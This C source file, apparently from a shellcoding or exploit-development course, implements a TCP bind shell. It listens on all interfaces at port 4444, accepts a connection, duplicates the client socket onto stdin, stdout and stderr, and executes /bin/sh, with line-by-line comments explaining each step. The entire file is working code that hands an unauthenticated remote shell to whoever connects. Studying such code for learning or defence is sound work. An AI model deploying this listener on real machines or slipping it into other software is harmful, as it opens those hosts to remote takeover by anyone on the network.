#include <unistd.h> // dup2, execve
#include <netinet/in.h> // socket structures and constants

#define PORT 4444

int main() {
  int sockfd, clientfd;
  struct sockaddr_in bind_addr;


  // CREATE SOCKET
  // create a new socket  (ipv4, tcp)
  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);


  // BIND TO ADDRESS
  // create the address to bind to
  bind_addr.sin_family = AF_INET; // ipv4
  bind_addr.sin_port = htons(PORT); // port in the correct endianness
  bind_addr.sin_addr.s_addr = INADDR_ANY; // NULL (0.0.0.0)
  
  // Bind to the specified address (0.0.0.0:4444)
  bind(sockfd, (struct sockaddr*) &bind_addr, sizeof(bind_addr));


  // LISTEN FOR CONNECTIONS
  // Listen for connections on this tcp socket
  listen(sockfd, 0);


  // ACCEPT CONNECTIONS
  // Accept connection on listening socket and save the new socket fd (client)
  clientfd = accept(sockfd, NULL, NULL);


  // CHANGE STD FILE DESCRIPTORS
  // Overwrite old stdin, stdout, stderr fd's with the client socket fd
  dup2(clientfd, 0); // stdin
  dup2(clientfd, 1); // stdout
  dup2(clientfd, 2); // stderr


  // EXECVE SHELL
  // Execute the new program /bin/sh, which will now use the client socket to
  //  handle it's stdin, stdout, and stderr
  execve("/bin/sh", NULL, NULL);


  // EXIT
  // This will never happen because execve closes out for us.
  return 0;
}
